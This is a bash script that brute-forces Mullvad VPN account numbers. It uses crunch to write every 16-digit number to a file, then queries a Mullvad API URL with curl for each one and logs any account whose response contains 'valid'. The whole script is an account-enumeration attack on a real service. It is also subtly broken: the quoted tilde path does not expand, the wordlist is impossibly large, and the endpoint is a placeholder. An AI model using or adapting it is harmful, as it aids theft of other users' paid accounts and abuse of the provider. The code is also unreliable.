#!/bin/bash

# Define parameters
output_dir="~/mulvad_testing"
output_file="${output_dir}/mulvad_accounts.txt"
min_length=16
max_length=16

# Ensure Crunch is installed
if ! command -v crunch &>/dev/null; then
    echo "Crunch is not installed. Installing..."
    sudo pacman -S crunch --noconfirm
fi

# Create output directory if it doesn't exist
mkdir -p "$output_dir"

# Generate all 16-digit numbers using Crunch
echo "Generating 16-digit numbers..."
crunch $min_length $max_length 0123456789 -o "$output_file"

# Optional: Test the generated numbers with Mullvad
echo "Testing generated Mullvad account numbers..."
while IFS= read -r account; do
    # Replace the below curl command with actual Mullvad API interaction
    # Note: You need an endpoint to test the account number
    response=$(curl -s "https://mullvad.net/api/account/$account")
    
    if [[ $response == *"valid"* ]]; then
        echo "Valid account found: $account" | tee -a "${output_dir}/valid_accounts.txt"
    fi
done <"$output_file"

echo "Testing complete. Results saved to ${output_dir}/valid_accounts.txt"
